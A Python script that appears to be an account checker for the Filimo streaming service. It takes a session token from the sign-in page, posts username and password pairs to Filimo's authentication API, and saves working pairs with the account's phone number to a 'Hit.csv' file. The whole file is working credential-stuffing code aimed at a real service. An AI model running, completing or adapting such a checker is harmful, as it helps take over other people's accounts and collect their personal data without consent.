#-_-
import requests as r , json as js , re , UserAgent as us , Color as c , pandas as pd
#°_°
#Class LogiN
class LogiN():
    req=r.session()
    #Params Api
    #Check UseR
    user_api="https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1"
    #LogiN api
    log_api="https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step2"
    #Headers
    head={
            "User-Agent":us.UseRAg().UseR()
            }
    #GuiD ApI
    guid_api="https://www.filimo.com/signin"
    guid=req.get(guid_api,headers=head).text
    #Find
    guid=re.findall('guid: "(.*)"',guid)[0]
    #TemP_Id
    id_api="https://www.filimo.com/api/fa/v1/user/Authenticate/auth"
    #Req
    id_req=req.post(id_api,json={"guid":guid},headers=head,timeout=5).text
    #JsoN
    ok=js.loads(id_req)['data']['attributes']['temp_id']
    #Log
    def log(self,username,password):
        #Params Check UseR
        params_ch={
                "account":username,
                "temp_id":LogiN.ok,
                "guid":LogiN.guid
                }
        #•_•
        #Req For ChecK
        req_ch=LogiN.req.post(LogiN.user_api,json=params_ch,headers=LogiN.head,timeout=5)
        #If
        if req_ch.ok == True:
            #LogiN ChecK
            #Phone 
            phone=js.loads(req_ch.text)['data']['attributes']['mobile_valid']
            #New Id
            new_id=js.loads(req_ch.text)['data']['attributes']['temp_id']
            #Params 
            params_login={
                    "temp_id":new_id,"account":username,"codepass_type":"pass","code":password,"guid":LogiN.guid
                    }
            #////
            #Req LogiN
            req_login=LogiN.req.post(LogiN.log_api,json=params_login,headers=LogiN.head,timeout=5)
            #If Login
            if "force_mobile_signin" in req_login.content.decode('utf-8'):
                #Ls
                my_ls=[]
                #Db
                db={"UseRNamE":username,"Password":password,"PhonENumbeR":phone}
                #Save
                my_ls.append(db)
                good=pd.DataFrame(my_ls)
                good.to_csv("File/Hit.csv",index=False)
                print(f"{c.C}Found {c.G}{username}{c.R}:{c.G}{password}\n{c.C}PhonENambeR {c.R}=> {c.G}{phone}{c.W}\n")
            elif req_login.status_code == 401:
                print(f"{c.C}Password {c.R}Not {c.C}Found {c.G}{username}{c.R}:{c.G}{password}{c.W}\n")
            else:
                print(f"{c.R}ErroR {c.G}=> ",req_login,"\n")
        elif req_ch.status_code == 406:
            print(f"{c.C}UseRNamE {c.R}No {c.C}LogiN {c.G}{username}{c.W}\n")
            
        else:
            print(f"{c.R}ErroR {c.C}=> ",req_ch,"\n") 
